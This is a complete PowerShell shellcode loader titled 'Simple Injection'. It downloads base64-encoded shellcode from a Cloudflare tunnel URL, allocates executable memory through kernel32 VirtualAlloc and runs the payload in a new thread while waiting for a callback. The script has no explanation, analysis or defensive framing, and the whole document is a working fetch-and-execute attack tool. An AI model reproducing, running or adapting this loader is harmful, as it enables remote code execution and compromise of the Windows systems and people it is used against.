$u='https://census-labels-warming-stevens.trycloudflare.com/payloads/shellcode.txt?key=a93c3a2ac43e3316'
[Net.ServicePointManager]::SecurityProtocol='Tls12'
Write-Host "[*] Simple Injection"
Write-Host "[*] Downloading shellcode..."
try{$sc=[Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($u));Write-Host "[+] Got $($sc.Length) bytes"}catch{Write-Host "[-] Download failed: $_";return}
$k='kernel32.dll'
Add-Type "using System;using System.Runtime.InteropServices;public class K{[DllImport(`"$k`")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(`"$k`")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr p,uint c,out uint i);[DllImport(`"$k`")]public static extern uint WaitForSingleObject(IntPtr h,uint m);}"
$m=[K]::VirtualAlloc([IntPtr]::Zero,[uint32]$sc.Length,0x3000,0x40)
Write-Host "[+] Allocated: 0x$($m.ToString('X'))"
[System.Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length)
Write-Host "[+] Copied shellcode"
$t=[uint32]0
$th=[K]::CreateThread([IntPtr]::Zero,0,$m,[IntPtr]::Zero,0,[ref]$t)
Write-Host "[+] Thread: $t"
Write-Host "[*] Waiting for callback..."
[K]::WaitForSingleObject($th,10000)|Out-Null
Write-Host "[+] Done"
